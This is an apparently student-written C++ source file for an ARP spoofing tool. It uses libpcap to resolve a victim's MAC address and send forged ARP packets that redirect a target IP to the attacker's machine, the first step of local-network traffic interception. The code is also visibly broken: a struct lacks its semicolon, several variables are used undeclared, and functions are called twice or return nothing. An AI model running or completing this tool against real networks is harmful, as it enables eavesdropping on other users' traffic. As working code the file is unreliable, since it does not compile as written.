#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <vector>

#define ARP_REQUEST 0x0001
#define ARP_REPLY 0x0002
#define ETH_TYPE 0x0001
#define IP_TYPE 0x0800
#define ARP_TYPE 0x0806

#define MAC_LEN 6
#define IP_LEN 4
#define ETHHDR_LEN 14
#define ARPHDR_LEN 42

const uint8_t BROADCAST[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t UNDEFINED[MAC_LEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

struct arp_header {
	uint8_t eth_dst_mac[MAC_LEN];
	uint8_t eth_src_mac[MAC_LEN];
	uint16_t eth_type;

	uint16_t arp_hdw_type;
	uint16_t arp_pro_type;
	uint8_t arp_hdw_len;
	uint8_t arp_pro_len;
	uint16_t arp_opcode;
	uint8_t arp_sen_mac[MAC_LEN];
	uint8_t arp_sen_ip[IP_LEN];
	uint8_t arp_tar_mac[MAC_LEN];
	uint8_t arp_tar_ip[IP_LEN];
};

struct session {
	uint8_t attacker_mac[MAC_LEN], attacker_ip[IP_LEN];
	uint8_t sender_mac[MAC_LEN], sender_ip[IP_LEN];
	uint8_t target_mac[MAC_LEN], target_ip[IP_LEN];
	session() {
		memset(sender_mac, 0, sizeof(sender_mac));
		memset(target_mac, 0, sizeof(target_mac));
	}
}

pcap_t* handle;
map<uint32_t, uint64_t> visited;
vector<session> vecSessions;

void usage() {
	printf("syntax : arp_spoof <interface> <sender ip1> <target ip1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int getinfo(int argc, char* argv[]) {
	if(argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}
	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if(handle == NULL) {
                fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
                return -1;
        }
	
	int session_len = (argc - 2) / 2;
	vecSessions.resize(session_len);
	for(int i = 0; i < session_len; i++) {
        	inet_pton(AF_INET, argv[2 * (i + 1)], vecSessions[i].sender_ip);
        	inet_pton(AF_INET, argv[2 * (i + 1) + 1], vecSessions[i].target_ip);
		if(i == 0) {
        		struct ifreq ifr;
        		int s = socket(AF_INET, SOCK_STREAM,0);
        		strcpy(ifr.ifr_name, dev);
        		ioctl(s, SIOCGIFHWADDR, &ifr);
        		memcpy(vecSessions[i].attacker_mac, (uint8_t*) ifr.ifr_hwaddr.sa_data, 6);
        		ioctl(s, SIOCGIFADDR, &ifr);
        		memcpy(vecSessions[i].attacker_ip, &((struct sockaddr_in *) &ifr.ifr_addr) -> sin_addr, 4);
        		close(s);
		}
		else {
			memcpy(vecSessions[i].attacker_mac, vecSessions[0].attacker_mac, MAC_LEN);
			memcpy(vecSessions[i].attacker_ip, vecSessions[0].attacker_ip, IP_LEN);
		}
	}
}

void send_arp(pcap_t* handle, uint8_t sen_mac[MAC_LEN], uint8_t sen_ip[IP_LEN], uint8_t tar_mac[MAC_LEN],  uint8_t tar_ip[IP_LEN], uint16_t opcode) {
	bool known = false;
	for(int i = 0; i < MAC_LEN; i++) {
		if(tar_mac[i] != 0x00)
			known = true;
	}
	
	arp_header* arp = (arp_header*) malloc(sizeof(arp_header));
	
	memcpy(arp -> eth_dst_mac, known ? tar_mac : BROADCAST, MAC_LEN);
	memcpy(arp -> eth_src_mac, sen_mac, MAC_LEN);
	arp -> eth_type = htons(ARP_TYPE);
	arp -> arp_hdw_type = htons(ETH_TYPE);
	arp -> arp_pro_type = htons(IP_TYPE);
	arp -> arp_hdw_len = MAC_LEN;
	arp -> arp_pro_len = IP_LEN;
	arp -> arp_opcode = htons(opcode);
	memcpy(arp -> arp_sen_mac, sen_mac, MAC_LEN);
	memcpy(arp -> arp_sen_ip, sen_ip, IP_LEN);
	memcpy(arp -> arp_tar_mac, known ? tar_mac : UNDEFINED, MAC_LEN);
	memcpy(arp -> arp_tar_ip, tar_ip, IP_LEN);
	
	u_char packet[ARPHDR_LEN];
	memcpy(packet, arp, ARPHDR_LEN);
	
	pcap_sendpacket(handle, packet, ARPHDR_LEN);
	free(arp);
}

void recv_mac(pcap_t* handle) {
	send_arp(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, ARP_REQUEST);
	
	struct pcap_pkthdr* header;
        const u_char* packet;
        arp_header* arp = (arp_header*) malloc(sizeof(arp_header));
        while(true) {
                int res = pcap_next_ex(handle, &header, &packet);
                if(res == 0) continue;

                memcpy(arp, packet, ARPHDR_LEN);
                if(ntohs(arp -> eth_type) != ARP_TYPE) continue;
                if(ntohs(arp -> arp_opcode) != ARP_REPLY) continue;
                if(memcmp(arp -> eth_dst_mac, attacker_mac, MAC_LEN) != 0) continue;
                if(memcmp(arp -> arp_sen_ip, sender_ip, IP_LEN) != 0) continue;
                if(memcmp(arp -> arp_tar_mac, attacker_mac, MAC_LEN) != 0) continue;
                if(memcmp(arp -> arp_tar_ip, attacker_ip, IP_LEN) != 0) continue;

                memcpy(sender_mac, arp -> eth_src_mac, MAC_LEN);
                break;
        }
	free(arp);
}

int main(int argc, char* argv[]) {
	if(getinfo(argc, argv) == -1) return -1;
	if(argc < 4 || argc % 2) {
		usage();
		return -1;
	}

	getinfo(argc, argv);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if(handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	recv_mac(handle);
	send_arp(handle, attacker_mac, target_ip, sender_mac, sender_ip, ARP_REQUEST);
	return 0;
}
